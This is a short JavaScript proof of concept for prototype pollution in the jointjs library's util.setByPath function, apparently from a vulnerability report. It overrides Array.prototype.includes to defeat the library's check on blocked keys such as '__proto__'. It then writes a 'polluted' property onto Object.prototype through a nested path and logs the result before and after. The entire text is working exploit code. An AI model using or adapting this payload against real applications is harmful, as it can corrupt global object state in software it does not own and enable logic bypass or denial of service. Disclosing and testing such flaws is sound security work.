Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const jointjs = require('jointjs');
jointjs.util.setByPath({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);